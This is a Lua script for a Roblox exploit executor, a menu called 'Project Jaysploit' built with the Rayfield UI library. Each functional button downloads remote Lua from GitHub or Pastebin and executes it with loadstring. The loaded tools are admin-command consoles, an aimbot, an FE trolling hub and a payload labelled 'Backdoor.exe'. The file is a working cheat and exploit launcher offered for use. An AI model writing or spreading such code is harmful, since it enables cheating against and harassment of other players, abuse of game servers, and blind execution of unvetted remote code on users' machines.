local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Project Jaysploit",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Wallmart CEO",
   LoadingSubtitle = "by Juan 💖",
   Theme = "Bloom", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Jaymart is my pookie"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Alpha Ksys",
      Subtitle = "Key System",
      Note = "Just send me a msg and ill send", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"https://raw.githubusercontent.com/Proj-Juan/Sigmannnnnn/refs/heads/main/COol"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Intro = Window:CreateTab("Info", 97695032681755)
local Button = Intro:CreateButton({
   Name = "Project Jaysploit",
   Callback = function()
   -- The function that takes place when the button is pressed
   end,
})
local Button = Intro:CreateButton({
   Name = "If you forget the key dm me",
   Callback = function()
   -- The function that takes place when the button is pressed
   end,
})
local Button = Intro:CreateButton({
   Name = "I luv u",
   Callback = function()
   -- The function that takes place when the button is pressed
   end,
})
local Button = Intro:CreateButton({
   Name = "So this is a script that i made for you :) and this is v1 so ya enjoy",
   Callback = function()
   -- The function that takes place when the button is pressed
   end,
})

local Universal = Window:CreateTab("Universal", 94139485891233)
local Button = Universal:CreateButton({
   Name = "Inf Yeild",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})
local Button = Universal:CreateButton({
   Name = "Nameless admin",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
   end,
})
local Button = Universal:CreateButton({
   Name = "Universal Aimbot",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
   end,
})

local Fe = Window:CreateTab("Fe/trolling", 129975845571738)
local Button = Fe:CreateButton({
   Name = "Sky Hub",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
   end,
})
local Button = Fe:CreateButton({
   Name = "Backdoor.exe",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/hExsBguZ"))()
   end,
})
